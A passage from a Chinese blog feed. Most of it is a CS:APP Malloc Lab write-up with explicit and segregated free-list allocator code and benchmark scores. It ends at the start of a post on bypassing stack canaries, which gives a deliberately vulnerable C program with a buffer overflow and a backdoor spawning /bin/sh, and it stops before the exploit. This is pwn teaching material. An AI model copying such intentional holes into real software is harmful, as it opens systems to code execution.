DSIZE; /* Minimum block size: WORD(HDR) + DWORD(Payload) + WORD(FTR) */ else asize = ALIGN(size + 8); /* Search the free list for a fit */ if ((bp = find_fit(asize)) != NULL) { place(bp, asize); return bp; } /* No fit. Get more memory and place the block */ extendsize = MAX(asize, CHUNKSIZE); if ((bp = extend_heap(extendsize / WSIZE)) == NULL) return NULL; place(bp, asize); return bp; } /* * mm_free - Freeing a block and coalesce if necessary. */ void mm_free(void *bp) { DBG_PRINTF(&#34;Entering mm_free(%p)\n&#34;, bp); /* Modify header and footer then coalesce the block and insert it into free list */ PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)),0)); PUT(FTRP(bp), PACK(GET_SIZE(HDRP(bp)),0)); coalesce(bp); } /* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */ void *mm_realloc(void *ptr, size_t size) { void *oldptr = ptr; void *newptr; size_t copySize; newptr = mm_malloc(size); if (newptr == NULL) return NULL; size = GET_SIZE(HDRP(oldptr)); copySize = GET_SIZE(HDRP(newptr)); if (size &lt; copySize) copySize = size; memcpy(newptr, oldptr, copySize-WSIZE); mm_free(oldptr); return newptr; } /* * coalesce - Merge freed block if necessary. * Return: Pointer of the merged block. */ static void* coalesce(void* bp) { DBG_PRINTF(&#34;Entering coalesce(%p), &#34;, bp); /* * We have to save our adjacent block&#39;s address. * After `PUT(HDRP(bp), PACK(newsize ,0))` will render NEXT_BLKP(bp) nonsense. * It&#39;s really nasty and takes me a lot of time to debug. */ void* prev_bp = PREV_BLKP(bp); void* next_bp = NEXT_BLKP(bp); size_t prev_alloc = GET_ALLOC(FTRP(prev_bp)); size_t next_alloc = GET_ALLOC(HDRP(next_bp)); size_t current_size = GET_SIZE(HDRP(bp)); /* Case 0: no need to coalesce */ if (prev_alloc &amp;&amp; next_alloc) { DBG_PRINTF(&#34;no merge\n&#34;); insert(bp); return bp; } /* * Case 1, previous block is free */ else if (!prev_alloc &amp;&amp; next_alloc) { DBG_PRINTF(&#34;merge prev(%p)\n&#34;, prev_bp); /* setup merged block */ current_size += GET_SIZE(HDRP(prev_bp)); PUT(HDRP(prev_bp), PACK(current_size, 0)); PUT(FTRP(bp), PACK(current_size, 0)); return prev_bp; } /* * Case 2, next block is free, we need to delete next block from free list. */ else if (prev_alloc &amp;&amp; !next_alloc) { DBG_PRINTF(&#34;merge next(%p)\n&#34;, next_bp); /* Delete next block from free list */ delete(next_bp); /* setup merged block */ current_size += GET_SIZE(HDRP(next_bp)); PUT(HDRP(bp), PACK(current_size, 0)); PUT(FTRP(bp), PACK(current_size, 0)); insert(bp); return bp; } /* * Case 3, previous and next block both are free, we need to delete next block from free list. */ else { DBG_PRINTF(&#34;merge prev(%p) and next(%p)\n&#34;, prev_bp, next_bp); /* Delete next block from free list */ delete(next_bp); /* setup merged block */ current_size += GET_SIZE(HDRP(prev_bp)); current_size += GET_SIZE(FTRP(next_bp)); PUT(HDRP(prev_bp), PACK(current_size, 0)); PUT(FTRP(next_bp), PACK(current_size, 0)); return prev_bp; } } /* * extend_heap - Extend the heap with a free block and coalesce the new free block if necessary. * Return : new free block&#39;s payload address. */ static void *extend_heap(size_t words) { char *bp; size_t size; /* Allocate even number of words to maintain alignment */ size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; if ((long)(bp = mem_sbrk(size)) == -1) return NULL; /* Initialize free block header/footer and the epilogue header * After mem_srbk(size), we are always at the end of epilogue footer, * so we need to change the epilogue ftr to normal header and setup epilogue footer at the end of heap. */ PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); // SET_BKP(bp, NULL); // SET_FDP(bp, NULL); /* Coalesce if the previous block was free */ return coalesce(bp); } /* find_fit - Find freeblock that fits the request size and return it&#39;s bp */ static void *find_fit(size_t asize) { DBG_PRINTF(&#34;Entering find_fit(%zu), &#34;, asize); /* Free list initailzed in mm_init(), freelist_headp points to the payload of free block */ /* Traverse free list */ for(void* current = freelist_headp; current != NULL; current = FDP(current)) { if (GET_SIZE(HDRP(current)) &gt;= asize) { DBG_PRINTF(&#34;found %p, size: %u\n&#34;, current, GET_SIZE(HDRP(current))); return current; } } /* Not found */ DBG_PRINTF(&#34;not found\n&#34;); return NULL; } /* place - Place requested block in current free block, split if necessary */ static void place(void *bp, size_t asize) { DBG_PRINTF(&#34;Entering place(%p)&#34;,bp); delete(bp); size_t size = GET_SIZE(HDRP(bp)); if ((size - asize) &gt;= MINBLOCKSIZE) { /* set up current block */ PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); DBG_PRINTF(&#34;split: %p and %p\n&#34;, bp, NEXT_BLKP(bp)); /* set up remain block */ PUT(HDRP(NEXT_BLKP(bp)), PACK(size-asize, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size-asize, 0)); coalesce(NEXT_BLKP(bp)); } else { DBG_PRINTF(&#34;no split\n&#34;); /* Waste some space, we have no other way */ PUT(HDRP(bp), PACK(size, 1)); PUT(FTRP(bp), PACK(size, 1)); } } /* * insert - Insert given block pointer to the head of free list. * insert() is called by free() or place() */ static void insert(void* bp) { DBG_PRINTF(&#34;Entering insert(%p)\n&#34;, bp); if (freelist_headp == NULL) { DBG_PRINTF(&#34;Free list is NULL, make %p the head of free list\n&#34;, bp); freelist_headp = bp; SET_FDP(bp, NULL); SET_BKP(bp, NULL); CHECKHEAP(0); return; } /* Set up current block */ SET_FDP(bp, freelist_headp); SET_BKP(bp, 0); /* Set next block */ SET_BKP(freelist_headp, bp); /* Free list head is np now */ freelist_headp = bp; CHECKHEAP(0); } /* * delete - Remove given block pointer from free list. * delete() is called by place() or coalesce(); * we dont&#39; call delete() when there&#39;s no free block, so what we deleted is what we inserted. */ static void delete(void* bp) { DBG_PRINTF(&#34;Entering delete(%p)\n&#34;, bp); /* Only one free block */ if(BKP(bp) == NULL &amp;&amp; FDP(bp) == NULL) { freelist_headp = NULL; } /* More than one free block, delete the first block */ else if (BKP(bp) == NULL) { /* Fix free list head */ SET_BKP(FDP(bp), NULL); freelist_headp = FDP(bp); } /* More than one free block, delete the last block */ else if (FDP(bp) == NULL) { SET_FDP(BKP(bp), NULL); } /* More than two free block, delete the middle block */ else { SET_FDP(BKP(bp), FDP(bp)); SET_BKP(FDP(bp), BKP(bp)); } CHECKHEAP(0); } static void mm_checkheap(int verbose) { DBG_PRINTF(&#34;---------------CHECK HEAP START---------------------\n&#34;); DBG_PRINTF(&#34;freelist_headp: %p\n&#34;, freelist_headp); if (freelist_headp) { DBG_PRINTF(&#34;Free List: %p&lt;-&#34;, BKP(freelist_headp)); for (char * tmp = freelist_headp; tmp != NULL; tmp = FDP(tmp)) { DBG_PRINTF(&#34;%p(size: %u)-&gt;&#34;, tmp, GET_SIZE(HDRP(tmp))); } DBG_PRINTF(&#34;%p\n&#34;, NULL); } DBG_PRINTF(&#34;---------------CHECK HEAP END----------------------\n&#34;); } 实现三：Segregated Free List（分离式空闲链表） 实现代码 得分84，还有优化的空间
Results for mm malloc: trace valid util ops secs Kops 0 yes 98% 5694 0.000302 18836 1 yes 94% 5848 0.000307 19061 2 yes 98% 6648 0.000374 17780 3 yes 99% 5380 0.000290 18526 4 yes 66% 14400 0.000525 27439 5 yes 89% 4800 0.001009 4757 6 yes 86% 4800 0.001024 4688 7 yes 55% 12000 0.007099 1690 8 yes 51% 24000 0.027033 888 9 yes 30% 14401 0.032619 441 10 yes 34% 14401 0.002412 5970 Total 73% 112372 0.072994 1539 Perf index = 44 (util) + 40 (thru) = 84/100 /* mm.c - Malloc package using segregated free list. Chunk details: Chunks of memory are maintained using a `boundary tag&#39; method as described in e.g., Knuth or Standish. (See the paper by Paul Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a survey of such techniques.) Sizes of free chunks are stored both in the front of each chunk and at the end. This makes consolidating fragmented chunks into bigger chunks very fast. The size fields also hold bits representing whether chunks are free or in use. An allocated chunk looks like this: header-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- | Size of chunk, in bytes |A| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . . . | footer-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- | Same as header(`boundary tag`) |A| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &#34;header&#34; is the front of the chunk for the purpose of most of the malloc code, but &#34;mem&#34; is the pointer that is returned to the user. Chunks always begin on even word boundaries, so the mem portion (which is returned to the user) is also on an even word boundary, and thus at least double-word aligned. Free chunks are stored in doubly-linked lists, and look like this: header-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- | Size of chunk, in bytes |A| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in free list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in free list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . | footer-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- | Same as header(`boundary tag`) |A| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The A (ALLOCATED) bit is set for prologue and epilogue block to help determine block&#39;s boundary. Prologue and epilogue block&#39;s size are set to 0. Heap structure: heap start-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- | 4 btes padding | free list heads-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Free list&#39;s head address(request size &lt;= 8) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Free list&#39;s head address(request size &lt;= 16) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | . . Same as above, request size &lt;= power of 2 . . | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Free list&#39;s head address(request size &gt; 4096) | prologue header-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A| prologue footer-&gt;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A| free and allocated chunks-&gt; +-+-+-+-+-+-+-+-+-+-+-+ | . . . . | epilogue footer-&gt;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The free list head stores the starting address of each free list for differnt size classes, from lower than 8 byts to bigger than 4096 bytes. We have 10 free list entry, so no padding is needed. */ #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &#34;mm.h&#34; #include &#34;memlib.h&#34; /********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/ team_t team = { /* Team name */ &#34;ateam&#34;, /* First member&#39;s full name */ &#34;Harry Bovik&#34;, /* First member&#39;s email address */ &#34;bovik@cs.cmu.edu&#34;, /* Second member&#39;s full name (leave blank if none) */ &#34;&#34;, /* Second member&#39;s email address (leave blank if none) */ &#34;&#34; }; /* Debugging macros: */ #define DEBUG 0 #define HEAP_CHECK 0 #if DEBUG == 1 # define DBG_PRINTF(...) printf(__VA_ARGS__) #else # define DBG_PRINTF(...) #endif #if HEAP_CHECK == 1 #define CHECKHEAP(verbose) mm_checkheap(verbose) #else #define CHECKHEAP(verbose) #endif /* 8 bytes alignment in 32bit mode */ #define ALIGNMENT 8 /* Rounds up to the nearest multiple of ALIGNMENT */ #define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7) //* Basic constants and macros: */ #define WSIZE 4 /* Word and header/footer size (bytes) */ #define DSIZE 8 /* Doubleword size (bytes) */ #define CHUNKSIZE (1&lt;&lt;12) /* Extend heap by this amount (bytes) */ #define MINBLOCKSIZE 16 /* Minimum block size: WORD(HDR) + WORD(FDP) + WORD(BKP) + WORD(FTR) */ #define ALLOCATED 1 #define UNALLOCATED 0 /* Max value of 2 values */ #define MAX(x, y) ((x) &gt; (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* Read and write a word at address p. */ #define GET(p) (*(unsigned int *)(p)) #define PUT(p, val) (*(unsigned int *)(p) = (val)) /* Read the size and allocated fields from address p */ #define GET_SIZE(p) (GET(p) &amp; ~0x7) #define GET_ALLOC(p) (GET(p) &amp; 0x1) /* Given block ptr bp, compute address of its header and footer */ #define HDRP(bp) ((char *)(bp) - WSIZE) #define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* Given block ptr bp, get value of foward and back pointer of that chunk (note those are different from HDRP() adn FTRP()) */ #define FDP(bp) (*(char **)(bp)) #define BKP(bp) (*(char **)(bp + WSIZE)) /* Given block ptr bp, set forward and back pointer&#39;s value of that block by given value*/ #define SET_FDP(bp, fdp) (FDP(bp) = fdp) #define SET_BKP(bp, bkp) (BKP(bp) = bkp) /* Given block ptr bp, compute address of next and previous blocks */ #define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp))) #define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE)) /* Given block size, compute the free list offset */ #define LIST_OFFSET(size) \ (size &lt;= 16 ? 0 :\ size &lt;= 32 ? 1 :\ size &lt;= 64 ? 2 :\ size &lt;= 128 ? 3 :\ size &lt;= 256 ? 4 :\ size &lt;= 512 ? 5 :\ size &lt;= 1024 ? 6 :\ size &lt;= 2048 ? 7 :\ size &lt;= 4096 ? 8 :\ 9) /* Global declarations */ static char *heap_listp; static char *seglist_start; static char *freelist_headp; /* Function prototypes for internal helper routines */ static void *coalesce(void *bp); static void *extend_heap(size_t words); static void *find_fit(size_t asize); static void place(void *bp, size_t asize); static void insert(void *bp); /* insert a free block to free list */ static void delete(void *bp); /* delete a free block from free list */ static void mm_checkheap(int verbose); /* * mm_init - initialize the malloc package. */ int mm_init(void) { /* Create the initial empty heap */ if ((heap_listp = mem_sbrk(14*WSIZE)) == (void *) -1) return -1; PUT(heap_listp, 0); /* Padding for alignment, user memory sits at 14*4 = 48 Bytes after heap start*/ PUT(heap_listp + (1*WSIZE), 0); /* Block size &lt;= 16 */ PUT(heap_listp + (2*WSIZE), 0); /* Block size &lt;= 32 */ PUT(heap_listp + (3*WSIZE), 0); /* Block size &lt;= 64 */ PUT(heap_listp + (4*WSIZE), 0); /* Block size &lt;= 128 */ PUT(heap_listp + (5*WSIZE), 0); /* Block size &lt;= 256 */ PUT(heap_listp + (6*WSIZE), 0); /* Block size &lt;= 512 */ PUT(heap_listp + (7*WSIZE), 0); /* Block size &lt;= 1024 */ PUT(heap_listp + (8*WSIZE), 0); /* Block size &lt;= 2048 */ PUT(heap_listp + (9*WSIZE), 0); /* Block size &lt;= 4096 */ PUT(heap_listp + (10*WSIZE), 0); /* Block size &gt; 4096 */ PUT(heap_listp + (11*WSIZE), PACK(DSIZE, 1)); /* Prologue header */ PUT(heap_listp + (12*WSIZE), PACK(DSIZE, 1)); /* Prologue footer */ PUT(heap_listp + (13*WSIZE), PACK(0, 1)); /* Epilogue header */ seglist_start = heap_listp + WSIZE; DBG_PRINTF(&#34;seglist_start: %p\n&#34;, seglist_start); /* Extend the empty heap with a free block of CHUNKSIZE bytes */ if (extend_heap(CHUNKSIZE/WSIZE) == NULL) /* set free list head to the first free block */ return -1; return 0; } /* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */ void *mm_malloc(size_t size) { DBG_PRINTF(&#34;Entering mm_malloc(%zu)\n&#34;, size); CHECKHEAP(0); size_t asize; /* Adjusted block size */ size_t extendsize; /* Amount to extend heap if not fit */ char *bp; /* Ignore spurious requests */ if (size == 0) { return NULL; } /* Adjust block size to include overhead and alignment reqs */ if (size &lt; DSIZE) asize = 2 * DSIZE; /* Minimum block size: WORD(HDR) + DWORD(Payload) + WORD(FTR) */ else asize = ALIGN(size + 8); /* Search the free list for a fit */ if ((bp = find_fit(asize)) != NULL) { place(bp, asize); return bp; } /* No fit. Get more memory and place the block */ extendsize = MAX(asize, CHUNKSIZE); if ((bp = extend_heap(extendsize / WSIZE)) == NULL) return NULL; place(bp, asize); return bp; } /* * mm_free - Freeing a block and coalesce if necessary. */ void mm_free(void *bp) { DBG_PRINTF(&#34;Entering mm_free(%p)\n&#34;, bp); CHECKHEAP(0); /* Modify header and footer then coalesce the block and insert it into free list */ PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)),0)); PUT(FTRP(bp), PACK(GET_SIZE(HDRP(bp)),0)); coalesce(bp); } /* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */ void *mm_realloc(void *ptr, size_t size) { DBG_PRINTF(&#34;Entering mm_realloc(%p, %zu)\n&#34;, ptr, size); CHECKHEAP(0); void *oldptr = ptr; void *newptr; size_t copySize; newptr = mm_malloc(size); if (newptr == NULL) return NULL; size = GET_SIZE(HDRP(oldptr)); copySize = GET_SIZE(HDRP(newptr)); if (size &lt; copySize) copySize = size; memcpy(newptr, oldptr, copySize-WSIZE); mm_free(oldptr); return newptr; } /* * coalesce - Merge freed block if necessary. * Return: Pointer of the merged block. */ static void* coalesce(void* bp) { DBG_PRINTF(&#34;Entering coalesce(%p), &#34;, bp); /* * We have to save our adjacent block&#39;s address. * After `PUT(HDRP(bp), PACK(newsize ,0))` will render NEXT_BLKP(bp) nonsense. * It&#39;s really nasty and takes me a lot of time to debug. */ void* prev_bp = PREV_BLKP(bp); void* next_bp = NEXT_BLKP(bp); size_t prev_alloc = GET_ALLOC(FTRP(prev_bp)); size_t next_alloc = GET_ALLOC(HDRP(next_bp)); size_t current_size = GET_SIZE(HDRP(bp)); /* Case 0: no need to coalesce */ if (prev_alloc &amp;&amp; next_alloc) { DBG_PRINTF(&#34;no merge\n&#34;); insert(bp); return bp; } /* * Case 1, previous block is free */ else if (!prev_alloc &amp;&amp; next_alloc) { DBG_PRINTF(&#34;merge prev(%p)\n&#34;, prev_bp); /* setup merged block */ current_size += GET_SIZE(HDRP(prev_bp)); delete(prev_bp); PUT(HDRP(prev_bp), PACK(current_size, 0)); PUT(FTRP(bp), PACK(current_size, 0)); insert(prev_bp); return prev_bp; } /* * Case 2, next block is free, we need to delete next block from free list. */ else if (prev_alloc &amp;&amp; !next_alloc) { DBG_PRINTF(&#34;merge next(%p)\n&#34;, next_bp); current_size += GET_SIZE(HDRP(next_bp)); /* Delete next block from free list */ delete(next_bp); /* setup merged block */ PUT(HDRP(bp), PACK(current_size, 0)); PUT(FTRP(bp), PACK(current_size, 0)); insert(bp); return bp; } /* * Case 3, previous and next block both are free, we need to delete next block from free list. */ else { DBG_PRINTF(&#34;merge prev(%p) and next(%p)\n&#34;, prev_bp, next_bp); current_size += GET_SIZE(HDRP(prev_bp)); current_size += GET_SIZE(FTRP(next_bp)); /* Delete prev and next block from free list */ delete(prev_bp); delete(next_bp); /* setup merged block */ PUT(HDRP(prev_bp), PACK(current_size, 0)); PUT(FTRP(next_bp), PACK(current_size, 0)); insert(prev_bp); return prev_bp; } } /* * extend_heap - Extend the heap with a free block and coalesce the new free block if necessary. * Return : new free block&#39;s payload address. */ static void *extend_heap(size_t words) { char *bp; size_t size; /* Allocate even number of words to maintain alignment */ size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; if ((long)(bp = mem_sbrk(size)) == -1) return NULL; /* Initialize free block header/footer and the epilogue header * After mem_srbk(size), we are always at the end of epilogue footer, * so we need to change the epilogue ftr to normal header and setup epilogue footer at the end of heap. */ PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); /* Coalesce if the previous block was free */ return coalesce(bp); } /* find_fit - Find freeblock that fits the request size and return it&#39;s bp */ static void *find_fit(size_t asize) { DBG_PRINTF(&#34;Entering find_fit(%zu), &#34;, asize); /* Traverse all the free lists */ for ( int i = 0; i &lt; 10; i++) { DBG_PRINTF(&#34;LIST_OFFSET: %d\n&#34;, i); freelist_headp = *(char **)(seglist_start + i * WSIZE); /* Traverse free list */ for(void* current = freelist_headp; current != NULL; current = FDP(current)) { if (GET_SIZE(HDRP(current)) &gt;= asize) { DBG_PRINTF(&#34;found %p, size: %u\n&#34;, current, GET_SIZE(HDRP(current))); return current; } } } /* Not found */ DBG_PRINTF(&#34;not found\n&#34;); return NULL; } /* place - Place requested block in current free block, split if necessary */ static void place(void *bp, size_t asize) { DBG_PRINTF(&#34;Entering place(%p)&#34;,bp); delete(bp); size_t size = GET_SIZE(HDRP(bp)); if ((size - asize) &gt;= MINBLOCKSIZE) { /* set up current block */ PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); DBG_PRINTF(&#34;split: %p and %p\n&#34;, bp, NEXT_BLKP(bp)); /* set up remain block */ PUT(HDRP(NEXT_BLKP(bp)), PACK(size-asize, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size-asize, 0)); coalesce(NEXT_BLKP(bp)); } else { DBG_PRINTF(&#34;no split\n&#34;); /* Waste some space, we have no other way */ PUT(HDRP(bp), PACK(size, 1)); PUT(FTRP(bp), PACK(size, 1)); } } /* * insert - Insert given block pointer to the head of free list. * insert() is called by free() or place() */ static void insert(void* bp) { DBG_PRINTF(&#34;Entering insert(%p)\n&#34;, bp); /* Locate freelist */ char **ptr_to_freelist_headp = (char **)(seglist_start + LIST_OFFSET(GET_SIZE(HDRP(bp))) * WSIZE); DBG_PRINTF(&#34;LIST_OFFSET: %d\n&#34;, LIST_OFFSET(GET_SIZE(HDRP(bp)))); freelist_headp = *ptr_to_freelist_headp; /* List is NULL, make bp as list head */ if (freelist_headp == NULL) { DBG_PRINTF(&#34;Free list is NULL, make %p the head of free list\n&#34;, bp); SET_FDP(bp, NULL); SET_BKP(bp, NULL); } /* insert */ else { DBG_PRINTF(&#34;Free list not null, %p will be new head\n&#34;, bp); /* Set up current block */ SET_FDP(bp, freelist_headp); SET_BKP(bp, 0); /* Set up next block */ SET_BKP(freelist_headp, bp); } /* Free list head is np now */ *ptr_to_freelist_headp = bp; return; } /* * delete - Remove given block pointer from free list. * delete() is called by place() or coalesce(); * we dont&#39; call delete() when there&#39;s no free block, so what we deleted is what we inserted. */ static void delete(void* bp) { DBG_PRINTF(&#34;Entering delete(%p)\n&#34;, bp); /* Locate freelist */ char **ptr_to_freelist_headp = (char **)(seglist_start + LIST_OFFSET(GET_SIZE(HDRP(bp))) * WSIZE); DBG_PRINTF(&#34;LIST_OFFSET: %d\n&#34;, LIST_OFFSET(GET_SIZE(HDRP(bp)))); /* Only one free block */ if(BKP(bp) == NULL &amp;&amp; FDP(bp) == NULL) { DBG_PRINTF(&#34;Only one free block\n&#34;); *ptr_to_freelist_headp = NULL; } /* More than one free block, delete the first block */ else if (BKP(bp) == NULL) { DBG_PRINTF(&#34;More than one free block, delete the first block\n&#34;); /* Fix free list head */ SET_BKP(FDP(bp), NULL); DBG_PRINTF(&#34;New list head: %p\n&#34;, FDP(bp)); *ptr_to_freelist_headp = FDP(bp); } /* More than one free block, delete the last block */ else if (FDP(bp) == NULL) { DBG_PRINTF(&#34;More than one free block, delete the last block\n&#34;); SET_FDP(BKP(bp), NULL); } /* More than two free block, delete the middle block */ else { DBG_PRINTF(&#34;More than two free block, delete the middle block\n&#34;); SET_FDP(BKP(bp), FDP(bp)); SET_BKP(FDP(bp), BKP(bp)); } } static void check_freelist() { printf(&#34;---------------CHECK FREE LIST START----------------------\n&#34;); for ( int i = 0; i &lt; 10; i++) { DBG_PRINTF(&#34;LIST_OFFSET: %d\n&#34;, i); freelist_headp = *(char **)(seglist_start + i * WSIZE); printf(&#34;freelist_headp: %p\n&#34;, freelist_headp); char *cur, *next; if ((cur = freelist_headp) != NULL) { printf(&#34;Free List: %p&lt;-&#34;, BKP(cur)); while(cur != NULL) { next = FDP(cur); printf(&#34;%p(size: %u)-&gt;&#34;, cur, GET_SIZE(HDRP(cur))); /* Check if next free block points to us */ if(next != NULL &amp;&amp; BKP(next) != cur) { printf(&#34;\nNext free block does not point to current block!\n&#34;); exit(1); } cur = next; } printf(&#34;%p\n&#34;, NULL); } else { printf(&#34;Free List is NULL.\n&#34;); } } printf(&#34;--------------- CHECK FREE LIST END ----------------------\n&#34;); } static void mm_checkheap(int verbose) { check_freelist(); /* * What we need to check: * Check epilogue and prologue blocks * Check each block’s address alignment * Check heap boundaries * Check each block’s header and footer: size(minimum size, slignment), previous/net allocate/free bit consistency, header and footer matching each other * Check coalescing: no two consecutive free blocks in the heap */ char *header_start = heap_listp + 11 * WSIZE; /* Prologue header */ /* Check prologue header */ if (GET_SIZE(header_start) != DSIZE || GET_ALLOC(header_start) != 1) { printf(&#34;Prologue Header Malformed. Size: %d, Alloc: %d\n&#34;, GET_SIZE(header_start), GET_ALLOC(header_start)); exit(1); } if (GET_SIZE(header_start + WSIZE) != DSIZE || GET_ALLOC(header_start + WSIZE) != 1) { printf(&#34;Prologue Footer Malformed.\n&#34;); exit(1); } /* Traverse blocks, check status */ char *header = header_start + DSIZE; while ( GET_SIZE(header) != 0) { /* Alignment */ if((unsigned long)(header + WSIZE) % ALIGNMENT) { printf(&#34;Address not aligned!\n&#34;); exit(1); } /* No adjacent free block */ char *next = header + GET_SIZE(header); if (!GET_ALLOC(header) &amp;&amp; !GET_ALLOC(next)) { printf(&#34;Adjacent free block!\n&#34;); printf(&#34;Current header: %p, size: %d alloc: %dx\n&#34;, header, GET_SIZE(header), GET_ALLOC(header)); printf(&#34;Next header: %p, size: %d alloc: %dx\n&#34;, header, GET_SIZE(next), GET_ALLOC(next)); check_freelist(); exit(1); } header = next; } } REF：
HarshTrivedi/malloc: An implementation of dynamic memory allocator in C using explicit free list, as according to the lab assignment of CS-APP book , reaching 91 % efficiency. (github.com) CSAPP:Lab5-Malloc Lab - 知乎 (zhihu.com) 六 Malloc Lab - 简书 (jianshu.com) ]]></content>
  </entry>
  
  <entry>
    <title>Canary绕过</title>
    <url>/post/canary-bypass.html</url>
    <categories><category>博客</category>
    </categories>
    <tags>
      <tag>PWN</tag>
      <tag>Canary</tag>
    </tags>
    <content type="html"><![CDATA[ Canary介绍 本节摘自CTF WIki，感谢CTF Wiki项目
Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。
在Linux中，Canary是一种栈溢出的防护机制，通常栈溢出都是输入超长的内容越过栈上的变量从而覆盖栈上返回地址的值，开启Canary后，在进入函数时会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：
mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax 在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。
mov rdx,QWORD PTR [rbp-0x8] xor rdx,QWORD PTR fs:0x28 je 0x4005d7 &lt;main+65&gt; call 0x400460 &lt;__stack_chk_fail@plt&gt; 在 GCC 中使用 Canary 可以在 GCC 中使用以下参数设置 Canary:
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护 -fstack-protector-all 启用保护，为所有函数插入保护 -fstack-protector-strong -fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护 -fno-stack-protector 禁用保护 绕过Canary保护示例 这里有一份存在Canary绕过漏洞的代码，和另一篇文章 ret2text的原理及利用 的代码类似，但是编译时开启了Canary保护，无法直接利用：
// canary.c // gcc canary.c -o canary-pie -fstack-protector-all -no-pie -Og -Wall #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void backdoor() { printf(&#34;Now entering backdoor...\n&#34;); execve(&#34;/bin/sh&#34;, 0, 0); printf(&#34;Leaving backdoor...\n&#34;); } void menu() { printf(&#34;1. write\n&#34;); printf(&#34;2. read\n&#34;); printf(&#34;3. exit\n&#34;); printf(&#34;your choice: &#34;); } int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); int choice; char buffer[16]; for (;;) { menu(); scanf(&#34;%d&#34;, &amp;choice); if (choice == 1) { printf(&#34;input something: &#34;); read(0, buffer, 0x64); } else if (choice == 2) { printf(&#34;your input: %s\n&#34;, buffer); } else if (choice == 3) { printf(&#34;exit\n&#34;); return 0; } else { printf(&#34;Wrong input!!!!\n&#34;); } } } 利用思路 